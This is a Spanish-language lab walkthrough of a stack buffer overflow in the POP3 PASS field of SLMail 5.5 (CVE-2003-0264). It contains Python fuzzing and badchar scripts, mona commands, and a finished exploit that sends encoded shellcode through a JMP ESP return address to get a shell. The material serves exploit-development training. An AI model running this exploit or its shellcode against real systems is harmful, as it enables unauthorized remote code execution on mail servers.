# Windows SLMail 5.5

SLMail está basado en los protocolos SMTP y POP3 siendo un software de servidor de correo para Microsoft™ Windows NT y 2000.&#x20;



## Preparación del entorno

### Versión de Windows

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Instalación SLMail

Se lo puede obtener a partir de su página web.

[https://slmail.software.informer.com/Descargar-gratis/](https://slmail.software.informer.com/Descargar-gratis/)

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Una vez descargado el ejecutable se deja todo por defecto y se presiona siguiente en todos los campos.



### Reglas de firewall

Como se puede apreciar, la máquina tiene abierto únicamente un puerto que no nos interesa.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Por lo que habrá que configurar reglas de entrada y salida del firewall de Windows, deberán quedar así en ambas:

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

Por lo que al realizar el escaneo nuevamente podemos ver expuestos los puertos 25 y 110:

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>



## Enumeración

Ya de antemano sabemos que el campo 'PASS' del servicio POP3 es vulnerable analizando el **CVE-2003-0264.** Por lo que ahora deberemos enumerar a partir de que numero de bytes generamos el desbordamiento. Para realizar esto primero vamos a obtener un estimado y después con una utilidad del framework de Metasploit veremos el número exacto.

### 1. Detectar campo vulnerable

Al realizar una conexión al servicio POP3 de SLMail identificamos el campo PASS, que es el que sabemos que es vulnerable, por lo que ahora con nuestro script debemos replicar esta conexión y fuzzear el número de caracteres en el campo PASS.

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

### 2. Fuzzear

Ahora para replicar la conexión que hicimos nos vamos a ayudar de la librería **socket** de python. Y vamos a estar mandando distintos buffers, aumentando el tamaño de cada uno hasta que el programa haga un Overflow y obtengamos un estimado de la cantidad de bytes.

{% code overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python3


################################################
# USAGE:                                       #
# python3 exploit.py <target-ip> <target-port> #
################################################

import sys, socket
from pwn import *

target_ip = sys.argv[1]
target_port = sys.argv[2]

if len(sys.argv) != 3:
	print("[!] Usage: python3 %s <target-ip> <target-port>" %(sys.argv[0]))
	exit(0)
	
if __name__ == '__main__':
    buffer = [b'\x41'] # \x41 es "A" en ascii
    acc = 350

    while len(buffer) < 50: # Le añadimos al array distintos tamaños de A's
        buffer.append(b'\x41' * acc)
        acc += 350
    
    for buf in buffer:
        try:
            print("[+] Enviando buffer de %s bytes" % len(buf)) 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, int(target_port)))

            s.send(b"USER test\r\n")
            payload = b"PASS " + buf + b"\r\n"
            s.send(payload)
            data = s.recv(1024) # Una vez se produzca el overflow no devolverá más data y se quedará colgado en el número de bytes que nos interesan
            s.close()
        except:
            print("[!] Error de conexion")
            sys.exit(1)
        
```
{% endcode %}

Ahora necesitamos calcular el número exacto de bytes a partir del cual se genera el overflow, sabemos que ronda los 3000 bytes, ya que es donde nuestro script deja de comunicarse con el proceso de SLMail, por lo que podremos usar una herramienta de Metasploit para calcular el número:

```python
patter-create -l <lengh-bytes>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Esta utilidad nos permite que al generar el overflow y fijarnos en que posición esta el EIP, nos dirá el número de bytes que desbordan la pila:

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

### 3. Eliminar Badchars

Para prevenir que nuestro shellcode crashee, vamos a tener que buscar y eliminar los badchars que puedan generar conflicto. Ayudándonos de la utilidad **mona** podremos generar un array de bytes, generar un overflow y comparar la lista de badchars generado con lo que está en memoria, si falta algo en memoria identificamos exitosamente uno de estos caracteres.&#x20;

```python
# Crea una carpeta en el escritorio con el nombre del proceso
!mona config -set workingfolder /path/%p  

# Genera un array de bytes excluyendo al 0x00 que sabemos que es un badchar por defecto
!mona bytearray -cpb '\x00'
```

Y el código para enviar los badchars nos quedaría así:

{% code lineNumbers="true" %}
```python
#!/usr/bin/python3

import sys
import socket
from pwn import *

target_ip = sys.argv[1]
target_port = sys.argv[2]

if len(sys.argv) != 3:
    print("[!] Usage: python3 %s <target-ip> <target-port>" % (sys.argv[0]))
    exit(0)

if __name__ == '__main__':
    badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, int(target_port)))

        s.send(b"USER test\r\n")
        payload = b"PASS " +  b"\x41" * 2606 + b'\x42' * 4 + badchars + b"\r\n"
        s.send(payload)
        data = s.recv(1024)
        s.close()
        
    except:
        print("[!] Error de conexion")
        sys.exit(1)
```
{% endcode %}

Ahora con mona podremos comparar los bytes en memoria con los de nuestro fichero que creamos:

```
!mona compare -f bytearray.bin -a <ESP>
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Como podemos ver el archivo se corrompe a los 9 bytes con el caracter 0a, esto lo podemos comprobar con el gráfico en memoria que nos genera el debugeador que estemos utilizando:

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Acá se puede ver que no está tampoco el caracter \0x0a , por lo que podemos concluir en que es un badchar. Falta repetir este proceso las veces que sean necesarias hasta que no encontremos más badchars, en este caso los badchars son: '\x00\x0a\x0d', por lo que al generar nuestra shellcode debemos excluirlos.



### 4.  Instrucción JUMP ESP

El offset que calculamos anteriormente nos da el número para saber cuantos bytes desbordan la pila, desde el registro EBP hasta justo antes del EIP que es en el que estamos actualmente, y como un proceso no puede directamente modificar este registro necesitamos aprovecharnos de algún modulo del proceso SLMail que tenga las protecciones **Rebase, SafeSEH, ASLR y NXCompat** en **FALSE** y que sea una DLL del sistema con un OP Code que haga un JUMP ESP para poder ejecutar el shellcode posteriormente.

Lo primero será buscar el OP code de la operación JUMP ESP:

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption><p>OP CODE '\xFF\E4'</p></figcaption></figure>

Para acceder a la lista de módulos del proceso es con !mona modules, buscando encontramos un potencial módulo que nos interesa:

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Ahora tenemos que buscar el OP Code JMP ESP en éste módulo, fijandonos que no tenga ningún badchar, esto lo podemos hacer con mona de la siguiente manera:

```
!mona find -s <OP-Code> -m <module>
!mona find -s '\xFF\xE4'
```

Y esto nos da un listado de posibles candidatos:

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Yo en este caso seleccioné esta:

![](<../../../.gitbook/assets/image (75).png>)

Ahora tenemos que saber que esta en formato Little Endian, por lo que para utilizar esta dirección deberemos dar vuelta esta address.&#x20;

## Explotación

### 1. Generar shellcode

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

### 2. Juntar todo y obtener una shell

Ahora para que el código funcione necesitamos agregar unos NOP's antes de la shellcode y en donde se encuentra el EIP poner la dirección de memoria donde se encuentre el JMP ESP para apuntar a nuestro shellcode:

{% code lineNumbers="true" %}
```python
#!/usr/bin/python3

import sys
import socket
from pwn import *

target_ip = sys.argv[1]
target_port = sys.argv[2]

if len(sys.argv) != 3:
    print("[!] Usage: python3 %s <target-ip> <target-port>" % (sys.argv[0]))
    exit(0)

if __name__ == '__main__':
    shellcode = (
        b"\xb8\xe0\xe0\xbd\x3f\xda\xca\xd9\x74\x24\xf4\x5e\x2b\xc9"
        b"\xb1\x52\x83\xee\xfc\x31\x46\x0e\x03\xa6\xee\x5f\xca\xda"
        b"\x07\x1d\x35\x22\xd8\x42\xbf\xc7\xe9\x42\xdb\x8c\x5a\x73"
        b"\xaf\xc0\x56\xf8\xfd\xf0\xed\x8c\x29\xf7\x46\x3a\x0c\x36"
        b"\x56\x17\x6c\x59\xd4\x6a\xa1\xb9\xe5\xa4\xb4\xb8\x22\xd8"
        b"\x35\xe8\xfb\x96\xe8\x1c\x8f\xe3\x30\x97\xc3\xe2\x30\x44"
        b"\x93\x05\x10\xdb\xaf\x5f\xb2\xda\x7c\xd4\xfb\xc4\x61\xd1"
        b"\xb2\x7f\x51\xad\x44\xa9\xab\x4e\xea\x94\x03\xbd\xf2\xd1"
        b"\xa4\x5e\x81\x2b\xd7\xe3\x92\xe8\xa5\x3f\x16\xea\x0e\xcb"
        b"\x80\xd6\xaf\x18\x56\x9d\xbc\xd5\x1c\xf9\xa0\xe8\xf1\x72"
        b"\xdc\x61\xf4\x54\x54\x31\xd3\x70\x3c\xe1\x7a\x21\x98\x44"
        b"\x82\x31\x43\x38\x26\x3a\x6e\x2d\x5b\x61\xe7\x82\x56\x99"
        b"\xf7\x8c\xe1\xea\xc5\x13\x5a\x64\x66\xdb\x44\x73\x89\xf6"
        b"\x31\xeb\x74\xf9\x41\x22\xb3\xad\x11\x5c\x12\xce\xf9\x9c"
        b"\x9b\x1b\xad\xcc\x33\xf4\x0e\xbc\xf3\xa4\xe6\xd6\xfb\x9b"
        b"\x17\xd9\xd1\xb3\xb2\x20\xb2\x7b\xea\xde\xcb\x14\xe9\x1e"
        b"\xdd\xb5\x64\xf8\xb7\x25\x21\x53\x20\xdf\x68\x2f\xd1\x20"
        b"\xa7\x4a\xd1\xab\x44\xab\x9c\x5b\x20\xbf\x49\xac\x7f\x9d"
        b"\xdc\xb3\x55\x89\x83\x26\x32\x49\xcd\x5a\xed\x1e\x9a\xad"
        b"\xe4\xca\x36\x97\x5e\xe8\xca\x41\x98\xa8\x10\xb2\x27\x31"
        b"\xd4\x8e\x03\x21\x20\x0e\x08\x15\xfc\x59\xc6\xc3\xba\x33"
        b"\xa8\xbd\x14\xef\x62\x29\xe0\xc3\xb4\x2f\xed\x09\x43\xcf"
        b"\x5c\xe4\x12\xf0\x51\x60\x93\x89\x8f\x10\x5c\x40\x14\x30"
        b"\xbf\x40\x61\xd9\x66\x01\xc8\x84\x98\xfc\x0f\xb1\x1a\xf4"
        b"\xef\x46\x02\x7d\xf5\x03\x84\x6e\x87\x1c\x61\x90\x34\x1c"
        b"\xa0")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, int(target_port)))

        s.send(b"USER test\r\n")
       
        payload = b"PASS " +  b"\x41" * 2606 + b'\x6B\xCC\x4B\x5F' + b'\x90' * 16 + shellcode + b"\r\n"
        s.send(payload)
        data = s.recv(1024)
        s.close()

    except:
        print("[!] Error de conexion")
        sys.exit(1)
```
{% endcode %}

Al explotar este código nos otorga una shell en la máquina víctima:

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
